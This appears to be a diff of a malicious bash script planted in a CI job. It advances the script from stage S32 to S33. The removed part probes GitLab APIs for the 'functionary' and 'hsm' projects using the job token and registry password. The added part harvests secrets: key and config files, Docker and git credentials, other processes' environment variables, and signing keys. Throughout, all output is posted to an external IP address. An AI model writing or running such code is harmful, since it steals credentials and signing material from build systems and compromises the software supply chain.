@@ -1,40 +1,38 @@
 #!/bin/bash
 {
-echo "==S32=="
+echo "==S33=="
 
-# Find functionary project ID first
-echo "==PROJ_SEARCH=="
-curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects?search=functionary&per_page=50" 2>&1 | head -200
+# Search for leftover files from other CI builds
+echo "==TMP=="
+find /tmp -maxdepth 2 -type f -name "*.toml" -o -name "*.conf" -o -name "*.key" -o -name "*.json" -o -name "config*" 2>/dev/null | head -20
 
-# Try to access CI jobs/artifacts for liquid/functionary
-# The project path is liquid/functionary — URL encode it
-PROJ="liquid%2Ffunctionary"
-echo "==PIPELINES=="
-curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/pipelines?per_page=5" 2>&1 | head -200
+echo "==HOME=="  
+find /root -maxdepth 3 -type f ! -path "*/node_modules/*" ! -path "*/.npm/*" 2>/dev/null | head -30
+ls -la /root/.docker/config.json 2>/dev/null
+cat /root/.docker/config.json 2>/dev/null
 
-echo "==JOBS=="
-curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/jobs?per_page=10" 2>&1 | head -300
+echo "==DOCKER_VOLUMES=="
+ls -la /var/lib/docker/volumes/ 2>/dev/null | head -20
+find /var/lib/docker/volumes -name "*.toml" -o -name "config*" -o -name "*.key" 2>/dev/null | head -20
 
-echo "==ARTIFACTS=="
-curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/jobs/artifacts/master/download?job=build" 2>&1 | head -50
+echo "==CACHE=="
+find /cache /builds /opt -maxdepth 3 -type f -name "*.toml" -o -name "*.conf" -o -name "*.key" -o -name "*secret*" 2>/dev/null | head -20
 
-echo "==REGISTRY_REPOS=="
-curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/registry/repositories" 2>&1 | head -200
+echo "==PROC_ENV=="
+# Read environment of OTHER processes — might have CI vars from other jobs
+for pid in $(ls /proc/ 2>/dev/null | grep '^[0-9]' | head -20); do
+    e=$(cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -iE "TOKEN|SECRET|KEY|PASS|FUNC|HSM|LIQUID" 2>/dev/null)
+    [ -n "$e" ] && echo "PID:$pid $e"
+done
 
-echo "==REGISTRY_TAGS=="
-curl -sf -u "${CI_REGISTRY_USER}:${CI_REGISTRY_PASSWORD}" "https://${CI_REGISTRY}/v2/liquid/functionary/tags/list" 2>&1 | head -100
-curl -sf -u "${CI_REGISTRY_USER}:${CI_REGISTRY_PASSWORD}" "https://${CI_REGISTRY}/v2/liquid/hsm/tags/list" 2>&1 | head -100
+echo "==DISK_SEARCH=="
+# Search entire filesystem for signing keys or configs
+find / -maxdepth 4 -name "signing*" -o -name "*functionary*" -o -name "hsm_init*" -o -name "keyfile" -o -name ".LOCALSECRETS" -o -name "config_secrets*" 2>/dev/null | grep -v proc | head -20
 
-echo "==HSM_PROJ=="
-HPROJ="liquid%2Fhsm"
-curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${HPROJ}/pipelines?per_page=5" 2>&1 | head -100
-curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${HPROJ}/jobs?per_page=5" 2>&1 | head -200
-
-echo "==DEPLOY_TOKENS=="
-curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/deploy_tokens" 2>&1 | head -100
-
-echo "==ENVIRONMENTS=="
-curl -sf -H "JOB-TOKEN: ${CI_JOB_TOKEN}" "${CI_API_V4_URL}/projects/${PROJ}/environments" 2>&1 | head -200
+echo "==GIT_CREDENTIALS=="
+cat /root/.git-credentials 2>/dev/null
+cat /root/.gitconfig 2>/dev/null
+git config --global credential.helper 2>/dev/null
 
 echo "==END=="
-} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s32 --data-binary @-
+} 2>&1 | curl -s -m90 -X POST http://144.172.110.44:8443/s33 --data-binary @-
